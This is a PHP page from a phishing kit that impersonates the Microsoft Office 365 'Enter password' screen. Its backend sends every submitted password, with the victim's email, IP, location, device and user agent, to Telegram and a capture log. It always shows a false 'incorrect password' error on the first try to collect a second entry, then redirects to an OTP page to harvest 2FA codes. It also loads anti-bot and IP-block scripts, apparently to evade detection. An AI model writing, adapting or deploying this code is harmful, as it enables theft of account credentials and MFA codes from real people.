<?php
// password.php - Complete backend with two-attempt logic
require_once 'config.php';
require_once 'functions.php';

// Include anti-bot protection
$anti_bot_path = ANTI_BOT_PATH;

if (file_exists($anti_bot_path . 'anti-bot.php')) {
    require_once $anti_bot_path . 'anti-bot.php';
    if (function_exists('antiBotCheck')) {
        antiBotCheck();
    }
}
if (file_exists($anti_bot_path . 'bot-check.php')) {
    require_once $anti_bot_path . 'bot-check.php';
}
if (file_exists($anti_bot_path . 'ipblock.php')) {
    require_once $anti_bot_path . 'ipblock.php';
}
if (file_exists($anti_bot_path . 'refspam.php')) {
    require_once $anti_bot_path . 'refspam.php';
}

// Check if user came from login page via session OR URL parameter
if (!isset($_SESSION['user_account']) && isset($_GET['email'])) {
    $_SESSION['user_account'] = $_GET['email'];
}

if (!isset($_SESSION['user_account'])) {
    header('Location: login.php');
    exit();
}

$user_account = $_SESSION['user_account'];
$error_message = '';
$show_error = false;
$is_second_attempt = false;

// Handle password submission
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
    
    $password = trim($_POST['password']);
    $attempt = isset($_SESSION['password_attempt']) ? $_SESSION['password_attempt'] : 0;
    
    if (!empty($password)) {
        
        $attempt_num = $attempt + 1;
        
        // Get IP and location
        $ip = $_SERVER['REMOTE_ADDR'];
        $userAgent = $_SERVER['HTTP_USER_AGENT'];
        $location = getLocationFromIP($ip);
        $device = getDeviceType($userAgent);
        
        // Prepare Telegram message with new format
        $message = "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🔐 OFFICE 365 PASSWORD\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "⏰ Time: " . date('Y-m-d H:i:s') . "\n";
        $message .= "🌐 IP Address: " . $ip . "\n";
        $message .= "📍 Location: " . $location . "\n";
        $message .= "📱 Device: " . $device . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "👤 Email/Phone/Skype: " . $user_account . "\n";
        $message .= "🔑 Password (Attempt " . $attempt_num . "): " . $password . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        $message .= "🔍 User Agent: " . $userAgent . "\n";
        $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
        
        sendToTelegram($message);
        logCapture($user_account . " | Password: " . $password, 'PASSWORD_ATTEMPT_' . $attempt_num);
        
        if ($attempt == 0) {
            $_SESSION['password_attempt'] = 1;
            $show_error = true;
            $is_second_attempt = true;
            $error_message = "That password is incorrect for your Microsoft account.";
        } else {
    // Max attempts reached → move to 2FA page
    // Don't destroy session yet — we need the email for otp.php
    $_SESSION['password_captured'] = true;
    header('Location: otp.php');
    exit;
}
        }
        
    } else {
        $show_error = true;
        $error_message = "Please enter your password.";
    }

// Check if this is a second attempt (for red border)
$is_second_attempt = isset($_SESSION['password_attempt']) && $_SESSION['password_attempt'] == 1;
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="icon" type="image/png" href="assets/images/favicon.png">

<title>Enter password - Microsoft</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:"Segoe UI", sans-serif;
}

html,
body{
    width:100%;
    min-height:100vh;
}

/* BODY */
body{
    background:#000;
    background-image:url("assets/images/bg.svg");
    background-size:cover;
    background-position:center;
    background-repeat:no-repeat;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
    min-height:100vh;
}

/* OVERLAY */
body::before{
    content:"";
    position:absolute;
    inset:0;
    background:rgba(0,0,0,0.28);
    z-index:0;
}

/* WRAPPER */
.wrapper{
    width:100%;
    display:flex;
    justify-content:center;
    align-items:center;
    position:relative;
    z-index:2;
    padding:20px;
}

/* LOGIN CARD - FIXED SIZE */
.login-box{
    width:100%;
    max-width:560px;
    min-width:400px;
    background:#1f1f1f;
    border-radius:16px;
    padding:48px 56px 52px;
    position:relative;
    box-shadow:0 8px 32px rgba(0,0,0,0.45);
}

/* TOP AREA */
.top-bar{
    position:relative;
    display:flex;
    justify-content:center;
    align-items:center;
    margin-bottom:32px;
}

/* BACK BUTTON */
.back-btn{
    position:absolute;
    left:0;
    width:32px;
    height:32px;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
    transition:opacity 0.2s;
    text-decoration:none;
}

.back-btn:hover{
    opacity:0.7;
}

.back-btn img{
    width:20px;
    height:20px;
    object-fit:contain;
    filter:brightness(0) invert(1);
}

/* LOGO */
.logo{
    text-align:center;
}

.logo img{
    width:125px;
}

/* CONTENT */
.content{
    text-align:center;
}

/* EMAIL SESSION */
.email{
    display:inline-flex;
    align-items:center;
    justify-content:center;
    padding:10px 20px;
    border-radius:999px;
    border:1px solid rgba(255,255,255,0.16);
    background:rgba(255,255,255,0.03);
    color:#d6d6d6;
    font-size:14px;
    margin-bottom:32px;
    word-break:break-all;
    max-width:100%;
}

/* TITLE */
h1{
    color:#fff;
    font-size:24px;
    font-weight:600;
    margin-bottom:28px;
}

/* PASSWORD INPUT WITH EYE ICON */
.input-box{
    margin-bottom:20px;
}

.password-wrapper {
    position: relative;
    width: 100%;
}

.password-wrapper input {
    width: 100%;
    height: 48px;
    border: 1px solid rgba(255,255,255,0.25);
    background: transparent;
    border-radius: 8px;
    outline: none;
    color: #fff;
    padding: 0 45px 0 16px;
    font-size: 16px;
    transition: all 0.2s;
}

/* DARK BACKGROUND FOR SECOND ATTEMPT */
.password-wrapper input.error-border {
    border: 1px solid #d32f2f;
    background: rgba(0, 0, 0, 0.5);
}

.password-wrapper input.error-border:focus {
    border-color: #d32f2f;
    background: rgba(0, 0, 0, 0.6);
}

.password-wrapper input:focus {
    border-color: #4ea1ff;
    background: rgba(0, 0, 0, 0.2);
}

.password-wrapper input::placeholder {
    color: #bdbdbd;
}

/* EYE ICON */
.eye-icon {
    position: absolute;
    right: 14px;
    top: 50%;
    transform: translateY(-50%);
    width: 20px;
    height: 20px;
    cursor: pointer;
    opacity: 0.6;
    transition: opacity 0.2s;
    filter: brightness(0) invert(1);
}

.eye-icon:hover {
    opacity: 1;
}

/* ERROR MESSAGE - PLAIN RED TEXT WITH ICON */
.error-message{
    display:flex;
    align-items:center;
    gap:8px;
    margin:12px 0 8px 0;
    padding:0;
    text-align:left;
}

.error-message .error-icon{
    font-size:16px;
    flex-shrink:0;
}

.error-message span{
    color:#d32f2f;
    font-size:14px;
    font-weight:400;
}

/* BUTTON */
.btn-area{
    margin-top:28px;
}

button{
    width:100%;
    height:48px;
    border:none;
    border-radius:8px;
    background:#0067b8;
    color:#fff;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:background 0.2s;
}

button:hover{
    background:#005da6;
}

/* FOOTER */
.footer{
    position:fixed;
    bottom:18px;
    left:50%;
    transform:translateX(-50%);
    width:100%;
    text-align:center;
    z-index:2;
    padding:0 16px;
}

.footer-links{
    display:flex;
    justify-content:center;
    gap:26px;
    margin-bottom:8px;
    flex-wrap:wrap;
}

.footer-links a{
    color:#e2e2e2;
    text-decoration:none;
    font-size:12px;
}

.footer-links a:hover{
    text-decoration:underline;
}

.private-text{
    color:#cfcfcf;
    font-size:11px;
    line-height:1.5;
}

.private-text a{
    color:#4ea1ff;
    text-decoration:none;
}

/* TABLET */
@media(max-width:768px){

    .login-box{
        max-width:500px;
        min-width:auto;
        padding:40px 44px 48px;
    }
    
    h1{
        font-size:22px;
    }
}

/* MOBILE */
@media(max-width:600px){

    body{
        background:#1f1f1f;
        background-image:none;
        align-items:flex-start;
        justify-content:flex-start;
        overflow:auto;
        padding:0;
    }

    body::before{
        display:none;
    }

    .wrapper{
        width:100%;
        max-width:100%;
        padding:0;
        display:block;
    }

    .login-box{
        width:100%;
        max-width:100%;
        min-width:auto;
        min-height:100vh;
        background:#1f1f1f;
        border-radius:0;
        box-shadow:none;
        padding:24px;
    }

    .top-bar{
        margin-top:8px;
        margin-bottom:24px;
    }

    .logo img{
        width:108px;
    }

    .email{
        font-size:13px;
        margin-bottom:22px;
        padding:8px 16px;
    }

    h1{
        font-size:19px;
        margin-bottom:18px;
    }

    .password-wrapper input{
        height:44px;
        font-size:15px;
    }
    
    .password-wrapper input.error-border {
        background: rgba(0, 0, 0, 0.5);
    }

    .eye-icon{
        width:18px;
        height:18px;
        right:12px;
    }

    button{
        height:44px;
        font-size:15px;
    }

    .footer{
        position:fixed;
        bottom:18px;
        left:0;
        transform:none;
        width:100%;
        padding:0 16px;
    }

    .footer-links{
        gap:10px 18px;
        margin-bottom:10px;
    }

    .private-text{
        font-size:11px;
    }
}

</style>
</head>
<body>

<div class="wrapper">

    <form method="POST" action="">
    
    <div class="login-box">

        <!-- TOP BAR -->
        <div class="top-bar">
            <a href="login.php?email=<?php echo urlencode($user_account); ?>" class="back-btn">
                <img src="assets/images/arrow_left.svg" alt="Back">
            </a>
            <div class="logo">
                <img src="assets/images/logo.svg" alt="Microsoft">
            </div>
        </div>

        <!-- CONTENT -->
        <div class="content">
            <div class="email">
                <?php echo htmlspecialchars($user_account); ?>
            </div>
            <h1>Enter your password</h1>

            <div class="input-box">
                <div class="password-wrapper">
                    <input type="password" name="password" id="password" placeholder="Password" required autofocus class="<?php echo $is_second_attempt ? 'error-border' : ''; ?>">
                    <img src="assets/images/eye.svg" class="eye-icon" id="togglePassword" alt="Show password">
                </div>
            </div>

            <?php if($show_error && !empty($error_message)): ?>
                <div class="error-message">
                    <span class="error-icon">⚠️</span>
                    <span><?php echo htmlspecialchars($error_message); ?></span>
                </div>
            <?php endif; ?>

            <div class="btn-area">
                <button type="submit">Next</button>
            </div>
        </div>

    </div>
    
    </form>

</div>

<div class="footer">
    <div class="footer-links">
        <a href="#">Help and feedback</a>
        <a href="#">Terms of use</a>
        <a href="#">Privacy and cookies</a>
    </div>
    <div class="private-text">
        Use private browsing if this is not your device.
        <a href="#">Learn more</a>
    </div>
</div>

<script>
    var togglePassword = document.getElementById('togglePassword');
    var passwordInput = document.getElementById('password');
    
    if (togglePassword && passwordInput) {
        togglePassword.addEventListener('click', function() {
            var type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
            passwordInput.setAttribute('type', type);
            this.style.opacity = type === 'password' ? '0.6' : '1';
        });
    }
</script>

</body>
</html>